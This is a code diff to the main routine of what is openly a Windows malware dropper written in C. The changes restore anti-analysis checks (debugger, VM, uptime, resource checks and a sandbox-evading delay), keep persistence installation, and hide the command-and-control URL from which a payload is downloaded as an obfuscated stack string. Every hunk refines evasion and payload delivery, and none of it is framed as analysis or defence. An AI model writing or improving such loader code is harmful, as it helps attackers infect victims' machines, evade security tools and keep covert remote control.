@@ -6,9 +6,8 @@
 #include "network.h"
 #include "injection.h"
 
-// --- MACRO PER IL DEBUG SICURO ---
 // if "DEBUG" flag is appended by compiler, print on screen
-// else, il preprocessor deletes the line
+// else, preprocessor deletes the line
 #ifdef DEBUG
     #define DEBUG_PRINT(fmt, ...) printf("[*] " fmt "\n", ##__VA_ARGS__)
 #else
@@ -28,25 +27,25 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
-    // TODO: FIX RESOURCE CHECK
+    // if TEST_MODE is on, these checks are skipped in compilation
+#ifndef TEST_MODE
     DEBUG_PRINT(" -> Checking system resources...");
-    /*
     if (!check_resources()) {
         DEBUG_PRINT("[!] Dynamic analysis detected. Exit.");
         return 0;
     }
-        */
 
     DEBUG_PRINT(" -> Checking Debugger, Uptime and VM...");
-    /*
     if (!check_debugger() || !check_uptime() || !check_vm()) {
         DEBUG_PRINT("[!] Dynamic analysis detected. Exit.");
         return 0;
     }
-    */
 
     DEBUG_PRINT(" -> Smart Delay in progress...");
     smart_delay();
+#else
+    DEBUG_PRINT("[!] TEST_MODE Active: Anti-Analysis and Smart Delay checks bypassed.");
+#endif
 
     // 2. PERSISTENCE
     DEBUG_PRINT("Installing Persistence...");
@@ -55,9 +54,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     install_persistence(my_path);
 
     // 3. DOWNLOAD PAYLOAD
-    DEBUG_PRINT("Downloading payload from: %s", C2_URL);
+    #ifdef DEBUG
+    // instantiating the stack string locally for debug printing purposes only
+    C2_URL(debug_url, debug_len);
+    DEBUG_PRINT("Downloading payload from: %s", debug_url);
+    #endif
+
     SIZE_T payload_size = 0;
-    char* payload = download_payload(C2_URL, &payload_size);
+    char* payload = download_payload(&payload_size);
 
     if (payload == NULL) {
         DEBUG_PRINT("[!] Payload download error.");
